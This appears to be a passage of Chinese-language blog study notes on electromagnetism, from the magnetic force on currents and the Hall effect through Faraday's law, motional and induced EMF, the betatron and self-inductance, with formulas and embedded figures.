<p><img data-src="https://sa1geblogimage-1316665129.cos.ap-beijing.myqcloud.com/img/image-20230513233739529.png" /></p>
<p><img data-src="https://sa1geblogimage-1316665129.cos.ap-beijing.myqcloud.com/img/image-20230513234225361.png" /></p>
<h3 id="无限大均匀载量平面">无限大均匀载量平面</h3>
<p><img data-src="https://sa1geblogimage-1316665129.cos.ap-beijing.myqcloud.com/img/image-20230513234531478.png" /></p>
<p><img data-src="https://sa1geblogimage-1316665129.cos.ap-beijing.myqcloud.com/img/image-20230513234544927.png" /></p>
<h3 id="载流密绕螺线管">载流密绕螺线管</h3>
<p><img data-src="https://sa1geblogimage-1316665129.cos.ap-beijing.myqcloud.com/img/image-20230513234610013.png" /></p>
<p><img data-src="https://sa1geblogimage-1316665129.cos.ap-beijing.myqcloud.com/img/image-20230513234734296.png" /></p>
<h3 id="计算方法">计算方法</h3>
<p>​
在稳恒电流分布具有某种对称性的条件下，利用安培环路定理可以十分方便地求出磁感应强度<span
class="math inline">\(\mathbf B\)</span></p>
<ol type="1">
<li>根据电流分布的对称性确定磁场分布的对称性</li>
<li>根据磁场分布的对称性适当地选取积分回路，使得<span
class="math inline">\(\mathbf B\)</span>与<span
class="math inline">\(d\mathbf l\)</span>要么互相平行，要么相互垂直</li>
</ol>
<h2 id="磁场对电流的作用">磁场对电流的作用</h2>
<h3 id="磁场对载流导线的作用">磁场对载流导线的作用</h3>
<p>​ 在载流导线取一电流元，电流元受到磁场的作用力 <span
class="math display">\[
d \mathbf F =Id\mathbf l \times \mathbf B
\]</span> ​ 积分得到载流导线受到磁场的总作用力 <span
class="math display">\[
\mathbf F=\int d\mathbf F=\int _L I d\mathbf l\times \mathbf B
\]</span> ​ 积分遍及整个载流导线. ### 计算法</p>
<ol type="1">
<li>任取一个电流元</li>
<li>确定该电流元所处磁场的磁感应强度<span class="math inline">\(\mathbf
B\)</span></li>
<li>由安培力公式写出该电流元受到的安培力<span
class="math inline">\(d\mathbf F=Id\mathbf l\times \mathbf
B\)</span></li>
<li>积分得到磁场对电流的作用力（矢量积分，方向不同需要分解）</li>
</ol>
<h3 id="电流强度的单位安培">电流强度的单位——安培</h3>
<p>​ 应用安培力公式计算得到</p>
<p><img data-src="https://sa1geblogimage-1316665129.cos.ap-beijing.myqcloud.com/img/image-20230514001727663.png" /></p>
<h3 id="均匀磁场对平面载流线圈的作用">均匀磁场对平面载流线圈的作用</h3>
<p>​ 设在磁感应强度<span class="math inline">\(\mathbf
B\)</span>的匀强磁场，有一刚性矩形载流为<span
class="math inline">\(I\)</span>线圈<span
class="math inline">\(abcda\)</span>，线圈可绕垂直于磁感应强度<span
class="math inline">\(\mathbf B\)</span>的轴<span
class="math inline">\(OO&#39;\)</span>转动.线圈的磁矩为<span
class="math inline">\(\mathbf m=IS\mathbf e_n\)</span>，其中<span
class="math inline">\(S=ab\cdot
da\)</span>是线圈的面积.假定某一时刻，线圈的磁矩<span
class="math inline">\(\mathbf m\)</span>或线圈法向单位矢量<span
class="math inline">\(\mathbf e_n\)</span>与磁感应强度<span
class="math inline">\(\mathbf B\)</span>之间的夹角为<span
class="math inline">\(\theta\)</span></p>
<p><img data-src="https://sa1geblogimage-1316665129.cos.ap-beijing.myqcloud.com/img/image-20230514002106920.png" /></p>
<p>​ 根据安培力公式，四个边受到安培力大小为 <span class="math display">\[
F_{ab}=Iab\sin(\frac{\pi}{2}+\theta)=IabB\cos \theta
\]</span></p>
<p><span class="math display">\[
F_{bc}=IbcB
\]</span></p>
<p><span class="math display">\[
F_{bc}=Iab\sin(\frac{\pi}{2}-\theta)=IabB\cos \theta
\]</span></p>
<p><span class="math display">\[
F_{da}=IdaB
\]</span></p>
<p>​
四个力的方向如图所示，从图上可以看出四个力的矢量和为零，即在匀强磁场中，载流线圈受到安培力的矢量和为零.</p>
<p>​ <span class="math inline">\(\mathbf F{ab}\)</span>和<span
class="math inline">\(\mathbf
F{cd}\)</span>在同一直线上，相互抵消，但<span
class="math inline">\(\mathbf F{bc}\)</span>和<span
class="math inline">\(\mathbf
F{da}\)</span>并不在同一直线上，两者形成一力偶，对线圈产生力矩作用.他们对线圈产生的磁力矩（力偶矩）<span
class="math inline">\(\mathbf M\)</span>的大小为 <span
class="math display">\[
\mathbf M=F_{da}ab\sin\theta =IdaBab\sin\theta=ISB\sin \theta =\mathbf
mB\sin\theta
\]</span> ​
从上式可以看出，匀强磁场对载流线圈产生的磁力矩不仅与线圈中电流强度I、线圈面积S以及磁感应强度<span
class="math inline">\(\mathbf
B\)</span>有关，还与线圈在磁场中的取向即线圈磁矩<span
class="math inline">\(\mathbf m\)</span>和磁感应强度<span
class="math inline">\(\mathbf B\)</span>之间的夹角<span
class="math inline">\(\theta\)</span>有关, <span class="math display">\[
\mathbf M=\mathbf m\times \mathbf B
\]</span> ​ 在磁力矩的作用下，线圈的磁矩<span
class="math inline">\(\mathbf m\)</span>将要朝着磁场的方向转动.</p>
<h3 id="磁力的功">磁力的功</h3>
<p>​ 载流导线和载流线圈在磁场中运动时，磁力就要对它们作功</p>
<p><img data-src="https://sa1geblogimage-1316665129.cos.ap-beijing.myqcloud.com/img/image-20230514003102137.png" /></p>
<p><img data-src="https://sa1geblogimage-1316665129.cos.ap-beijing.myqcloud.com/img/image-20230514003133923.png" /></p>
<p>​ 得到一般式 <span class="math display">\[
A=I \mathbf{\Delta  \Phi_m}
\]</span> ​ <img data-src="https://sa1geblogimage-1316665129.cos.ap-beijing.myqcloud.com/img/image-20230514003312573.png" /></p>
<h3 id="计算法">计算法</h3>
<ol type="1">
<li>确定磁场对载流导线的作用力和对载流线圈的力矩，然后利用力作功及力矩作功的定义求解。</li>
<li>利用电流强度乘以导线切割的磁场线条数或乘以穿过电流回路的磁通量增量来计算.<span
class="math inline">\(A=I \mathbf{\Delta  \Phi_m}\)</span></li>
</ol>
<h2 id="磁场对运动电荷的作用">磁场对运动电荷的作用</h2>
<p>​
我们称磁场对运动电荷的作用力为洛伦兹力.安培力就其微观的本质而言，可以归结为导线中大量运动电荷受到洛伦兹力的宏观表现.</p>
<p>​ 设一电流元<span class="math inline">\(Id\mathbf
l\)</span>处在外磁场中，电流元所在处磁感应强度为<span
class="math inline">\(\mathbf
B\)</span>.根据安培力公式，该电流元受到的安培力为<span
class="math inline">\(d\mathbf F=Id\mathbf l\times \mathbf
B\)</span>，若电流元中载流子总数为<span
class="math inline">\(dN\)</span>，每个载流子所带电荷为q、定向运动速度为<span
class="math inline">\(\mathbf v\)</span>，根据安培力公式，电流量矢量
<span class="math display">\[
Id\mathbf l=q\mathbf vdN
\]</span> ​ 将上式代入安培力公式，得： <span class="math display">\[
d\mathbf F=q\mathbf v\times \mathbf BdN
\]</span> ​ 由此得到带电为q、运动速度为<span
class="math inline">\(\mathbf
v\)</span>的一个带电粒子在磁场中的受到的洛伦兹力<span
class="math inline">\(\mathbf F&#39;\)</span>为 <span
class="math display">\[
\mathbf F&#39;=\frac{d\mathbf F}{dN}=q\mathbf v\times \mathbf B
\]</span> ​ 根据上式，运动电荷受到的洛伦兹力<span
class="math inline">\(\mathbf F&#39;\)</span>的大小为 <span
class="math display">\[
\mathbf F&#39;=|q|vB\sin \theta
\]</span> ​ 式中<span
class="math inline">\(\theta\)</span>是电荷运动速度<span
class="math inline">\(\mathbf v\)</span>与<span
class="math inline">\(\mathbf B\)</span>之间的夹角.<span
class="math inline">\(\mathbf
F&#39;\)</span>的方向垂直于电荷运动速度<span
class="math inline">\(\mathbf v\)</span>和磁感应强度<span
class="math inline">\(\mathbf
B\)</span>所决定的平面，指向由右手螺旋定则确定.</p>
<p>​ 由于洛伦兹力始终与电荷的运动速度<span class="math inline">\(\mathbf
v\)</span>相垂直，所以洛伦兹力对运动电荷作的功恒等于零，也就是说洛伦兹力只能改变带电粒子的运动方向，不能改变带电粒子的速率.</p>
<p>​
当带电粒子在既有电场又有磁场的区域运动时，作用在该粒子上电场力和磁场力的矢量和为
<span class="math display">\[
\mathbf F=q(\mathbf E+\mathbf v\times \mathbf B)
\]</span> ​
上式称为普遍情况下的洛伦兹力公式，它是电磁学的基本公式之一，普遍成立.</p>
<p>​
根据普遍的洛伦兹力公式，带电粒子在电磁场中的运动方程可设为（重力可忽略）
<span class="math display">\[
q(\mathbf E+\mathbf v\times \mathbf B)=\frac{d\mathbf p}{dt}
\]</span> ​ 当例子运动速度远小于光速时，上式可写为 <span
class="math display">\[
q(\mathbf E+\mathbf v\times \mathbf B)=m\mathbf a
\]</span> ​ 对于带电粒子在匀强磁场中的运动，下面分为两种情况讨论：</p>
<h3 id="v和b垂直">v和B垂直</h3>
<p>​ 设质量为m、带电为q的粒子在磁感应强度为<span
class="math inline">\(\mathbf
B\)</span>的匀强电场中运动，粒子的速度<span
class="math inline">\(\mathbf v\)</span>始终与磁感应强度<span
class="math inline">\(\mathbf B\)</span>垂直，洛伦兹力<span
class="math inline">\(\mathbf
F\)</span>只能改变带电粒子的运动方向，因此，粒子将在垂直于<span
class="math inline">\(\mathbf
B\)</span>的平面内作匀速率圆周运动.设粒子运动的圆轨道半径为R，根据牛顿第二定律，有
<span class="math display">\[
qvB=m\frac{v^2}{R}
\]</span> ​ 由此得到粒子的<strong>轨道半径</strong>为 <span
class="math display">\[
R=\frac{mv}{qB}
\]</span> ​ 式中q/m称为带电粒子的<strong>荷质比</strong>.</p>
<p>​ 对于给定的带电粒子，荷质比是一定的，所以当<span
class="math inline">\(\mathbf
B\)</span>一定时，粒子的速率越大，粒子做圆周运动的轨道半径越大.</p>
<p>​ 粒子在匀强磁场中作<strong>半径为R的圆周运动</strong>时的周期T为
<span class="math display">\[
T=\frac{2\pi R}{v}=\frac{2\pi m}{qB}
\]</span> ​
由上式可知，在低速条件下，<strong>带电粒子在匀强磁场中旋转的周期与粒子的速度无关</strong>.</p>
<p>​
当粒子运动速度很高时，根据狭义相对论，带电粒子的<strong>质量m将随着粒子速度的增加而增加</strong>，因而粒子的旋转周期将随着粒子速度的增加而变长，为了使带电粒子不断得到加速，高频电场的频率要随着粒子的加速过程而同步变化.</p>
<h3 id="v和b成θ角">v和B成θ角</h3>
<p>​ 设带电粒子的速度<span class="math inline">\(\mathbf
v\)</span>和磁感应强度<span class="math inline">\(\mathbf
B\)</span>之间的夹角为θ，如图</p>
<p><img data-src="https://sa1geblogimage-1316665129.cos.ap-beijing.myqcloud.com/img/image-20230514010734118.png" style="zoom:150%;" /></p>
<p>​ 在这种情况下，可以将粒子运动速度<span class="math inline">\(\mathbf
v\)</span>分解为平行于<span class="math inline">\(\mathbf
B\)</span>的分量<span class="math inline">\(v_{//}=v\cos
\theta\)</span>和垂直于<span class="math inline">\(\mathbf
B\)</span>的分量<span
class="math inline">\(v_\bot=v\sin\theta\)</span>.粒子沿平行于<span
class="math inline">\(\mathbf B\)</span>的的方向以速度<span
class="math inline">\(v_{//}=v\cos
\theta\)</span>作匀速运动，而在垂直于<span class="math inline">\(\mathbf
B\)</span>的方向内以速率<span
class="math inline">\(v_\bot=v\sin\theta\)</span>作匀速率圆周运动，合成的运动轨迹为螺旋线.粒子的回转半径、旋转周期T和螺距h分别为
<span class="math display">\[
R=\frac{mv_\bot}{qB}=\frac{mv\sin\theta}{qB}
\]</span></p>
<p><span class="math display">\[
T=\frac{2\pi R}{v_\bot}=\frac{2\pi m}{qB}
\]</span></p>
<p><span class="math display">\[
h=v_{//}T=\frac{2\pi mv\cos \theta}{qB}
\]</span></p>
<p>​ <img data-src="https://sa1geblogimage-1316665129.cos.ap-beijing.myqcloud.com/img/image-20230514011508864.png" /></p>
<h2 id="霍尔效应">霍尔效应</h2>
<p>​ 将一块通有电流I的导电板，放在磁感应强度为<span
class="math inline">\(\mathbf
B\)</span>的匀强磁场中，当磁场方向与电流方向垂直时，在垂直于电流的另一个方向上，即在导体板a、b两个表面之间会出现微弱的电势差<span
class="math inline">\(U_{ab}\)</span>，这一现象被称为霍尔效应. <span
class="math display">\[
U_{ab}=R_H\frac{IB}{d}
\]</span> ​ 式中的比例系数<span
class="math inline">\(R_H\)</span>是一个常量，称为<strong>霍尔系数</strong>.</p>
<p><img data-src="https://sa1geblogimage-1316665129.cos.ap-beijing.myqcloud.com/img/image-20230514011820820.png" style="zoom:150%;" /></p>
<p>​ 形成原因：</p>
<p>​
设在导电板内单位体积内<strong>载流子的数目为n</strong>，每个载流子<strong>所带电荷为q</strong>，定向运动速度为<span
class="math inline">\(\mathbf
v\)</span>，先讨论载流子带正电，即q&gt;0的情况.</p>
<p>​ 载流子定向运动方向将沿电流方向，载流子在磁场中受到洛伦兹力<span
class="math inline">\(F_m\)</span>的大小为<span
class="math inline">\(F_m=qvB\)</span>方向向下,在洛伦兹力的作用下，载流子向下偏移，结果a面不断积累正电荷，b面不断积累负电荷，在a、b两个表面之间逐渐形成一个不断增强的电场<span
class="math inline">\(\mathbf
E\)</span>，称为<strong>霍尔电场</strong>.载流子会同时受到霍尔电场的作用力<span
class="math inline">\(F_e，F_e\)</span>的大小为<span
class="math inline">\(F_e=qE\)</span>,方向向上，于洛伦兹力的方向相反，最终霍尔电场力和洛伦兹力<strong>达到平衡</strong>时，<strong>电荷积累过程停止</strong>，最终形成了稳定的霍尔电场<span
class="math inline">\(E\)</span>和电压<span
class="math inline">\(U_{ab}\)</span>.</p>
<p>​ 定量分析</p>
<p>​ 霍尔电场力和洛伦兹力达到平衡： <span class="math display">\[
qE=qvB
\]</span> ​<br />
<span class="math display">\[
E=vB
\]</span> ​ 若l为导体板宽度，d为板的厚度，则a、b两个表面之间的电压<span
class="math inline">\(U_{ab}\)</span>为 <span class="math display">\[
U_{ab}=El=vBl
\]</span> ​ 另外，导体中的电流强度为 <span class="math display">\[
I=nqvS=nqvld
\]</span> ​ 将上面两式联立 <span class="math display">\[
U_{ab}=\frac{1}{nq}\frac{IB}{d}
\]</span> ​ 得到霍尔系数为 <span class="math display">\[
R_H=\frac{1}{nq}
\]</span></p>
<ol type="1">
<li>霍尔系数与载流子浓度n成正比.</li>
<li>霍尔系数的正负由载流子电荷的正负决定，而霍尔电压的正负取决于霍尔系数的正负.</li>
</ol>
<h1 id="电磁感应">电磁感应</h1>
<blockquote>
<p><strong>James Clerk Maxwell</strong> <a
href="https://en.wikipedia.org/wiki/Fellow_of_the_Royal_Society_of_Edinburgh">FRSE</a>
<a
href="https://en.wikipedia.org/wiki/Fellow_of_the_Royal_Society">FRS</a>
(13 June 1831 – 5 November 1879) was a Scottish mathematician and
scientist responsible for the <a
href="https://en.wikipedia.org/wiki/Classical_theory">classical
theory</a> of <a
href="https://en.wikipedia.org/wiki/Electromagnetic_radiation">electromagnetic
radiation</a>, which was the first theory to describe electricity, <a
href="https://en.wikipedia.org/wiki/Magnetism">magnetism</a> and light
as different manifestations of the same phenomenon. <a
href="https://en.wikipedia.org/wiki/Maxwell&#39;s_equations">Maxwell's
equations</a> for electromagnetism have been called the "<a
href="https://en.wikipedia.org/wiki/Unification_(physics)#Unification_of_magnetism,_electricity,_light_and_related_radiation">second
great unification in physics</a>" where <a
href="https://en.wikipedia.org/wiki/Unification_(physics)#Unification_of_gravity_and_astronomy">the
first one</a> had been realised by <a
href="https://en.wikipedia.org/wiki/Isaac_Newton">Isaac Newton</a>.</p>
<p><img data-src="https://upload.wikimedia.org/wikipedia/commons/thumb/b/b0/James-Clerk-Maxwell-1831-1879.jpg/800px-James-Clerk-Maxwell-1831-1879.jpg" alt="James-Clerk-Maxwell-1831-1879.jpg" style="zoom: 33%;" /></p>
</blockquote>
<h2 id="法拉第电磁感应定律">法拉第电磁感应定律</h2>
<h3 id="电源电动势">电源电动势</h3>
<p>​ 电源：在电路中提供非静电力的装置</p>
<p>​ 电动势：定量地描述电源转化能量的能力大小，用<span
class="math inline">\(A_非\)</span>表示电源内电荷从负极移动到正极时非静电力作的功，电源的电动势<span
class="math inline">\(\epsilon\)</span>定义为 <span
class="math display">\[
\epsilon =\frac{A_非}{q}
\]</span> ​
上式表明，电源的电动势等于非静电力把单位正电荷<strong>从负极经电源内部移动到正极</strong>时所做的功.</p>
<p>​
电动势是一个标量，但通常将电源内部电势升高的方向规定为电动势的方向.</p>
<p>​ 用<span
class="math inline">\(E_k\)</span>表示非静电性的场强，则作用在电荷q上的非静电力为<span
class="math inline">\(\mathbf F_k=q\mathbf
F_k\)</span>，则电源内部，电荷q由负极移动到正极时非静电力所作的功为
<span class="math display">\[
A_非=\int _{(-)} ^{(+)}\mathbf F_k\cdot d\mathbf l
\]</span> ​ 得到： <span class="math display">\[
\epsilon =A_非=\int _{(-)} ^{(+)}\mathbf E_k\cdot d\mathbf l
\]</span> ​ 若非静电力存在于整个闭合电流回路中，这时整个回路的总电动势为
<span class="math display">\[
\epsilon =\oint _L \mathbf E_k\cdot d\mathbf l
\]</span> ​ 上式适用于任何包含电源的闭合电路.</p>
<p>​ 电动势一般都取决于电源本身的性质，而与外电路无关.</p>
<p>​
电磁感应现象：当穿过一闭合导体回路所围面积内的磁通量发生变化时，无论这种变化是何种原因引起的，该回路中就会产生电流.这种电流称为<strong>感应电流</strong>，而驱动电流的电动势被称为<strong>感应电动势</strong>，这种现象称为电磁感应现象.</p>
<h2 id="法拉第电磁感应定律-1">法拉第电磁感应定律</h2>
<p>​
导体回路产生的感应<strong>电动势大小</strong>与穿过导体回路的<strong>磁通量变化率</strong>成正比.</p>
<p>​ 数学表达式如下： <span class="math display">\[
\epsilon =-\frac{d\Phi_m}{dt}
\]</span> ​ 楞次定律判断感应电流、感应电动势的方向</p>
<p>​
楞次定律：闭合回路中，感应电流的方向总是使得它自身所产生的磁通量<strong>反抗</strong>引起感应电流的<strong>磁通量变化</strong>.</p>
<p>​ 楞次定律实际上是<strong>能量守恒定理</strong>在电磁学的一种体现.</p>
<blockquote>
<p>假设感应电流的方向是顺时针，它将增强磁通的变化进而产生更强的感应电流，这种“正反馈”过程将直接导致能量守恒定理的破坏.</p>
</blockquote>
<p>​
若线圈是N匝<strong>串联</strong>而成的，且穿过各匝线圈的<strong>磁通量相等</strong>，则由于磁通量的变化，整个线圈的感应电动势<span
class="math inline">\(\epsilon\)</span>应等于各匝线圈中感应电动势的代数和
<span class="math display">\[
\epsilon = -N\frac{d\Phi_m}{dt}=-\frac{d\psi}{dt}
\]</span> ​ 我们称<span
class="math inline">\(\psi=N\Phi_m\)</span>为<strong>磁通匝链数</strong>.</p>
<p>​ 设线圈中的电阻为R，则通过线圈的感应电流为 <span
class="math display">\[
I=-\frac{1}{R}\frac{d\psi}{dt}
\]</span> ​ 在<span class="math inline">\(\Delta
t=t_2-t_1\)</span>的时间内，流过线圈任一匝导线横截面的感应电荷为 <span
class="math display">\[
q=|\int _{t_1} ^{t_2}Idt|=\frac{1}{R}|\int _{t_1}
^{t_2}d\psi|=\frac{1}{R}|\psi_2-\psi_1|
\]</span> ​
上式表明流过线圈的感应电荷仅与<strong>磁通匝链数变化的绝对值</strong>成正比.</p>
<p>​
用法拉第定律求解回路中的感应电动势，关键是找到回路中的磁通量表达式.一般情况下，磁通量是时间的函数，通过对时间求导即可得到感应电动势的大小.</p>
<h2 id="动生电动势">动生电动势</h2>
<p>​
由法拉第电磁感应定律和磁通量定义得到：要使闭合回路上的磁通量发生变化，大体有以下三种方式“</p>
<ol type="1">
<li>磁场中回路的面积发生变化</li>
<li>磁场与回路间的夹角发生变化</li>
<li>回路中磁场发生变化</li>
</ol>
<p>​
前两种情况都属于导体回路或其一部分在磁场中运动，我们称这两种情况为<strong>动生电动势</strong>.</p>
<p>​ 而将由于磁场发生变化产生的电动势称为<strong>感生电动势</strong>.</p>
<h3 id="运动导体中的感应电动势">运动导体中的感应电动势</h3>
<p>​
我们把导体或导体回路在稳恒磁场中运动，或导体回路的形状在稳恒磁场中变化时产生的感应电动势称为动生电动势.</p>
<p>​ 当导线ab以速度<span class="math inline">\(\mathbf
v\)</span>向右运动时，其中的自由电子被带着以同一速度向右运动，因而每个电子都受到洛伦兹力<span
class="math inline">\(\mathbf F_m\)</span>的作用， <span
class="math display">\[
\mathbf F_m=-e\mathbf v\times \mathbf B
\]</span> ​ 它所对应的非静电场强<span class="math inline">\(\mathbf
E_k\)</span>为 <span class="math display">\[
\mathbf E_k=-\frac{\mathbf F_m}{e}=\mathbf v\times \mathbf B
\]</span> ​ 根据电动势的定义，这一非静电性场强所产生的电动势为 <span
class="math display">\[
\epsilon=\int_b ^a \mathbf E_k\cdot d\mathbf l=\int _b ^a(\mathbf
v\times \mathbf B)\cdot d\mathbf l
\]</span> ​
显然，产生动生电动势的非静电力是<strong>洛伦兹力</strong>.</p>
<p>​ 当整个闭合导体回路L都在磁场中运动时，则在回路中产生的动生电动势为
<span class="math display">\[
\epsilon=\oint(\mathbf v\times \mathbf B)\cdot d\mathbf l
\]</span> ​ <code>补偿法可以使得某些问题简化</code></p>
<p><img data-src="https://sa1geblogimage-1316665129.cos.ap-beijing.myqcloud.com/img/image-20230514171700202.png" /></p>
<p><img data-src="https://sa1geblogimage-1316665129.cos.ap-beijing.myqcloud.com/img/image-20230514171713590.png" /></p>
<p><img data-src="https://sa1geblogimage-1316665129.cos.ap-beijing.myqcloud.com/img/image-20230514171918932.png" /></p>
<p>​ 圆盘可以看作是多条沿圆盘直径方向的细棒并联而成.</p>
<h3 id="转动线圈的感应电动势">转动线圈的感应电动势</h3>
<p><img data-src="https://sa1geblogimage-1316665129.cos.ap-beijing.myqcloud.com/img/image-20230514172042511.png" alt="image-20230514172042511" style="zoom:200%;" /></p>
<p>​ abcd是面积为S、匝数为N的矩形线圈，在匀强磁场<span
class="math inline">\(\mathbf B\)</span>中以匀角速度<span
class="math inline">\(\omega\)</span>绕中心轴<span
class="math inline">\(OO&#39;\)</span>转动.若t=0时刻线圈的法线<span
class="math inline">\(mathbf e_n\)</span>平行于<span
class="math inline">\(\mathbf B\)</span>,t时刻线圈的发现<span
class="math inline">\(\mathbf e_n\)</span>与磁感应强度<span
class="math inline">\(\mathbf B\)</span>间的夹角<span
class="math inline">\(\theta =\omega
t\)</span>这时通过线圈的磁通匝链数为 <span class="math display">\[
\psi=N\mathbf B\cdot S=NBS\cos \omega t
\]</span> ​ 因此有 <span class="math display">\[
\epsilon =-\frac{d\psi}{dt}=NBS\omega \sin \omega t=\epsilon_m \sin
\omega t
\]</span> ​</p>
<p>​ 式中<span class="math inline">\(\epsilon
=NBS\omega\)</span>是动生电动势的<strong>最大值</strong>.</p>
<p>​ 对于线圈而言，取一段弧微元，然后使用<span
class="math inline">\(dl=rd\theta\)</span>通常能起到很好的效果.</p>
<h3 id="计算法-1">计算法</h3>
<p>​ 动生电动势求解的问题大致有两种</p>
<ol type="1">
<li>求一段形状规则的切割磁感线的运动导线两端的电动势</li>
<li>求一段形状复杂的切割磁感线的运动导线两端的电动势，“以直代曲”</li>
</ol>
<h2 id="感生电动势">感生电动势</h2>
<p>​
把导体回路固定不变，穿过回路磁通量的变化仅仅是<strong>由于磁场变化所引起的感应电动势</strong>称为<strong>感生电动势</strong>.</p>
<pre class="mermaid">


graph LR
	变化的磁场--&gt;有旋电场--&gt;自由电荷--&gt;感生电动势

</pre>
<p>不论有无导体或导体回路，变化的磁场都将在其周围空间产生具有<strong>闭合电场线的电场</strong>，并称此为<strong>有旋电场</strong>或<strong>感生电场</strong>，正是这种有旋电场决定了感生电动势.</p>
<h3 id="感生电动势方向的确定">感生电动势方向的确定</h3>
<p>​ Maxwell给出公式 <span class="math display">\[
\epsilon =\oint \mathbf E_v\cdot d\mathbf
l=-\frac{d\psi}{dt}=-\iint\limits_S \frac{\partial \mathbf B}{\partial
t}\cdot dS
\]</span> ​ 式中<span class="math inline">\(\mathbf
E_V\)</span>表示有旋电场的电场强度.积分区间S是以闭合路径L为周界的平面或曲面.</p>
<p>​
式子说明：在变化的磁场中，<strong>感生电动势</strong>等于电场强度<span
class="math inline">\(\mathbf
E_v\)</span>对<strong>任意闭合路径L</strong>的<strong>线积分</strong>，也等于这一闭合路径所包围面积上<strong>磁通量的变化率</strong>.</p>
<p>​
静电场与有旋电场都具有能量，都对电荷有力的作用，这是两者的共同点，但它们也有重要区别：</p>
<p><img data-src="https://sa1geblogimage-1316665129.cos.ap-beijing.myqcloud.com/img/image-20230514175229473.png" /></p>
<p>​
闭合路径L的积分绕行正方向与其所包围面积的法线正方向满足右手螺旋定则，则由积分式可知：<span
class="math inline">\(\mathbf E_v\)</span>线的方向与<span
class="math inline">\(\partial \mathbf B /\partial
t\)</span>的方向之间满足右手螺旋法则.</p>
<p><img data-src="https://sa1geblogimage-1316665129.cos.ap-beijing.myqcloud.com/img/image-20230514175527244.png" style="zoom:150%;" /></p>
<p>一般由楞次定律判断，感生电动势形成的感应电流会产生磁场去反抗磁场的变化.</p>
<p>例题：</p>
<p><img data-src="https://sa1geblogimage-1316665129.cos.ap-beijing.myqcloud.com/img/image-20230514200231584.png" /></p>
<p><img data-src="https://sa1geblogimage-1316665129.cos.ap-beijing.myqcloud.com/img/image-20230514200304448.png" /></p>
<p><img data-src="https://sa1geblogimage-1316665129.cos.ap-beijing.myqcloud.com/img/image-20230514200812883.png" /></p>
<h3 id="计算法-2">计算法</h3>
<p>​ 计算感生电动势的方法有两种：</p>
<ol type="1">
<li><p>对<strong>一段导体</strong>的感生电动势，常用: <span
class="math display">\[
\epsilon=\int_a ^b \mathbf E_v \cdot d\mathbf l
\]</span> 进行计算。</p>
<p>故先计算出<span class="math inline">\(\mathbf
E_v\)</span>，再积分，即可得到感生电动势大小.</p>
<p>但一般情况下，计算<span class="math inline">\(\mathbf
E_v\)</span>是困难的，只有具有某些对称性的情况才能求出</p></li>
<li><p>对于<strong>闭合回路</strong>的感生电动势，常用： <span
class="math display">\[
\epsilon=\oint \mathbf E_v \cdot d\mathbf l=-\frac{d\Phi_m}{dt}
\]</span> 进行计算.</p>
<p>为此常先求出待求闭合回路的磁通量，再利用此式，即可计算出感生电动势.</p>
<p>如果是非闭合导体，可通过<strong>先做辅助线构成闭合回路</strong>再计算.</p></li>
</ol>
<h3 id="电子感应加速器">电子感应加速器</h3>
<p><img data-src="https://sa1geblogimage-1316665129.cos.ap-beijing.myqcloud.com/img/image-20230514201700766.png" /></p>
<p>​ 利用强的交变电流激励产生交变磁场，变化的磁场产生有旋电场，电场强度为
<span class="math display">\[
\mathbf E_v=\frac{1}{2\pi r}\left | \frac{d\Phi_m}{dt} \right |
\]</span> ​ 该有旋电场的电场线是一些同心圆.</p>
<p>​ 如何使电子稳定在圆形轨道上加速</p>
<p>​ 设电子圆形轨道处的磁感应强度的大小为<span
class="math inline">\(B_R\)</span>,则<span
class="math inline">\(B_R\)</span>必须满足 <span class="math display">\[
ev B_R=m\frac{v^2}{R}
\]</span> ​</p>
<p>​ 其中，v是电子运动某时刻的速率，R是电子圆轨道的半径，因此有 <span
class="math display">\[
B_R=\frac{mv}{eR}
\]</span> ​
由上式可以看出，要使电子在有确定半径R的轨道上运动，要求磁感应强度<span
class="math inline">\(B_R\)</span>随电子动量的增加而增加，上式两边对时间求导，得
<span class="math display">\[
\frac{dB_R}{dt}=\frac{1}{eR}\frac{d(mv)}{dt}
\]</span> ​ 电子沿圆轨道切向运动，其动量变化率等于它受到的切向力<span
class="math inline">\(eE_v\)</span>，所以上式又可写为 <span
class="math display">\[
\frac{dB_R}{dt}=\frac{E_v}{R}
\]</span> ​ 将<span class="math inline">\(\mathbf E_v=\frac{1}{2\pi
r}\left | \frac{d\Phi_m}{dt} \right |\)</span>代入，得 <span
class="math display">\[
\frac{dB_R}{dt}=\frac{1}{2}\frac{d\bar B}{dt}
\]</span> ​ 上式表明，<span class="math inline">\(\bar B\)</span>和<span
class="math inline">\(B_R\)</span>一直在改变，但应一直保持 <span
class="math display">\[
B_R=\frac{1}{2}\bar B
\]</span></p>
<h3 id="涡电流">涡电流</h3>
<p>​
将大块金属放置在随时间变化的磁场中，或使其在非均匀磁场中运动，由于变化的磁场激起的有旋电场的作用，都有可能在导体中产生很大的感应电流，通常称此电流为涡电流或涡流.</p>
<h3 id="电磁阻尼">电磁阻尼</h3>
<p>​
涡流会产生磁效应，形成电磁阻力，阻碍运动.我们称这种现象为电磁阻尼.</p>
<h2 id="自感与互感">自感与互感</h2>
<h3 id="自感">自感</h3>
<p>​
导体电流发生变化，通过回路自身所包围面积中磁通量也将发生变化，从而在该回路中产生感应电动势.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">graph LR;</span><br><span class="line">	电流变化--&gt;磁通量变化--&gt;感应电动势--&gt;阻碍电流变化</span><br></pre></td></tr></table></figure>
<p>​ 设一回路通有电流I，根据毕-萨定律，该电流产生的磁感应强度<span
class="math inline">\(\mathbf B\)</span>与回路电流<span
class="math inline">\(I\)</span>成正比，所以穿过该回路的磁通匝链数<span
class="math inline">\(\psi\)</span>也与电流<span
class="math inline">\(I\)</span>成正比，即 <span class="math display">\[
\psi=LI
\]</span> ​ 式中的比例系数称为该回路的自感系数，简称自感.</p>
<p>​
自感L的大小仅取决于<strong>回路的大小、形状、线圈的匝数以及其中磁介质的情况.</strong></p>
<p>​ 在SI中，自感的单位是<strong>亨利</strong>(<span
class="math inline">\(H或mH、\mu H等\)</span>)</p>
<p>​ 若回路的自感L保持不变，则通过回路的磁通匝链数<span
class="math inline">\(\psi\)</span>仅随回路中电流I的变化而变化.根据法拉第电磁感应定律，自感电动势为
<span class="math display">\[
\epsilon _L=-\frac{d\psi}{dt}=-L\frac{dI}{dt}
\]</span> ​ 以上可得自感系数的另一种表达形式： <span
class="math display">\[
L=-\frac{\epsilon}{\frac{dI}{dt}}
\]</span> ​ 其中的负号表示自感电动势<span
class="math inline">\(\epsilon_L\)</span>产生的感应电流的方向总是<strong>反抗回路中电流I的变化.</strong></p>
<p>​
